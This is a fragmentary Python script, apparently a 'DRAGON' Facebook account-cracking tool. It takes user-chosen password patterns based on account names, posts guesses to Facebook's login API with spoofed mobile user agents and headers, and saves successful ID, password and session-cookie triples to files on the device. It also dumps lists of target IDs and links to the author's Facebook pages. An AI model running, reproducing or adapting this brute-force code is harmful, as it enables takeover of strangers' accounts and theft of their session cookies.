...
def randBuildLSB():
    ...
    END = 'Mozilla/5.0 (Linux; Android 6;en_GB; T-Mobile myTouch 3G Side Build/R844) AppleWebKit/533.1 (KHTML, like Gecko) Version/6.0.1 Chrome/74.0.9078.998 Mobile Safari/533.36 [FB_IAB/FB4A;FBAV/267.0.0.26.369;]'
    ua = f'Mozilla/5.0 (Linux; Android 6;en_GB; T-Mobile myTouch 3G Side Build/R844) AppleWebKit/533.1 (KHTML, like Gecko) Version/6.0.1 Chrome/74.0.9078.998 Mobile Safari/533.36 [FB_IAB/FB4A;FBAV/267.0.0.26.369;]'+END
    return ua
...
\033[1;95m| $$  | $$| $$  \ $$| $$  | $$| $$  \ $$| $$  | $$| $$\  $$$
\033[1;96m| $$$$$$$/| $$  | $$| $$  | $$|  $$$$$$/|  $$$$$$/| $$ \  $$
\033[1;96m|_______/ |__/  |__/|__/  |__/ \______/  \______/ |__/  \__/
                                                                                                                                                                                     
\033[1;95m------------------------------------------------
\033[1;95m Owner   :            Aung Zaw Tun
\033[1;96m Facebook:            Aung Zaw Tun
\033[1;96m Github  :            DRAGON
\033[1;95m Version :            1.0
\033[1;95m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back DRAGON Menu ")
        exit()
...
def sarfraz():   
 ...
 #   print(f'[7] Remove Trash Files ')
  ...
  #  print(f'[9] Remove Duplicate IDs')
    print(f'[W] Join Facebook ')
    print(f'[F] Join Messenger ')
    print('')
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://www.facebook.com/aztynk007')
        pass
    elif select =='F':
        os.system('xdg-open https://m.me/aztynk007')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;96m {S}[DG] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
                ua='Mozilla/5.0 (Linux; Android 6;en_GB; T-Mobile myTouch 3G Side Build/R844) AppleWebKit/533.1 (KHTML, like Gecko) Version/6.0.1 Chrome/74.0.9078.998 Mobile Safari/533.36 [FB_IAB/FB4A;FBAV/267.0.0.26.369;]'
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [DG-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/DG_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DG_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [DG-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/DG_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[DG] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
    ...
    def pasw(self):       
            ...
            os.system("clear")
            print(logo)
            print(f'{S} \033[1;95mEXAMPLE: first123,last1122,firstlast,last,ETC')
            print('')
            if sl =='':
                ...
                for sr in range(sl):
                    pw.append(input(f'\033[1;95mPassword {sr+1}: '))
            os.system("clear")
            print(logo)
            
            #print(f"\r{A}Use flight (airplane) mode before use {S}")
            print(47*"-")
            print(f'{S} \033[1;96mTotal IDs : %s ' % len(self.id))
            print(f'{S} \033[1.;95mDRAGON COMMING ...')
            print(47*"-")
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/DG.txt') 
        print(47*"-")
...
def follower():
    ...
    try:
        ...
        print('')
        print(47*"-")
        print (f"\033[1;96mTotal IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
        print (f"File Saved To : {filepath} ")
        print(47*"-")
        input("Press Enter To Back Menu ")
